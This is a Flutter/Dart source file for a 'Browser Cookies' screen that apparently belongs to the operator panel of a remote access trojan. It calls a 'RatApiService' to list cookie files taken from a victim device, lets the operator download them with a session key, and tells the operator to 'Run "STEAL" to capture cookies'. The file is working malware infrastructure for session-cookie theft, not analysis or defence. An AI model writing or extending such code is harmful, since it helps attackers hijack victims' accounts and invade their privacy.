import 'package:flutter/material.dart';
import 'package:intl/intl.dart';
import 'api_service.dart';
import 'constants.dart';
import 'package:url_launcher/url_launcher.dart';

class CookiesScreen extends StatefulWidget {
  final String deviceId;
  final String sessionKey;

  const CookiesScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<CookiesScreen> createState() => _CookiesScreenState();
}

class _CookiesScreenState extends State<CookiesScreen> {
  late RatApiService _api;
  List<dynamic> _cookies = [];
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _api = RatApiService(widget.sessionKey);
    _load();
  }

  Future<void> _load() async {
    setState(() => _isLoading = true);
    try {
      final data = await _api.getCookies(widget.deviceId);
      setState(() => _cookies = data);
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Load error: $e')));
    } finally {
      setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    const kBg = Color(0xFF0F172A);
    const kCard = Color(0xFF1E293B);
    const kBorder = Color(0xFF334155);
    const kBlue = Color(0xFF3B82F6);

    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(
        title: const Text('Browser Cookies', style: TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: kCard,
        elevation: 0,
        actions: [
          IconButton(onPressed: _load, icon: const Icon(Icons.refresh_rounded)),
        ],
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: kBlue))
          : _cookies.isEmpty
              ? _emptyState()
              : ListView.builder(
                  padding: const EdgeInsets.all(16),
                  itemCount: _cookies.length,
                  itemBuilder: (ctx, i) {
                    final item = _cookies[i];
                    final date = DateTime.tryParse(item['date'] ?? '') ?? DateTime.now();
                    return Container(
                      margin: const EdgeInsets.only(bottom: 12),
                      decoration: BoxDecoration(
                        color: kCard,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kBorder),
                      ),
                      child: ListTile(
                        leading: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(color: Colors.orange.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
                          child: const Icon(Icons.cookie_rounded, color: Colors.orange, size: 20),
                        ),
                        title: Text(item['name'] ?? 'cookies.txt', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                        subtitle: Text(
                          'Size: ${(item['size'] / 1024).toStringAsFixed(1)} KB • ${DateFormat('yyyy-MM-dd HH:mm').format(date)}',
                          style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12),
                        ),
                        trailing: IconButton(
                          icon: const Icon(Icons.download_rounded, color: kBlue),
                          onPressed: () => launchUrl(Uri.parse(item['url'] + "&key=${widget.sessionKey}")),
                        ),
                      ),
                    );
                  },
                ),
    );
  }

  Widget _emptyState() {
    return Center(
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        Icon(Icons.cookie_rounded, size: 64, color: Colors.white.withOpacity(0.1)),
        const SizedBox(height: 16),
        Text('No cookies harvested yet', style: TextStyle(color: Colors.white.withOpacity(0.5))),
        const SizedBox(height: 8),
        const Text('Run "STEAL" to capture cookies', style: TextStyle(color: Colors.white24, fontSize: 12)),
      ]),
    );
  }
}
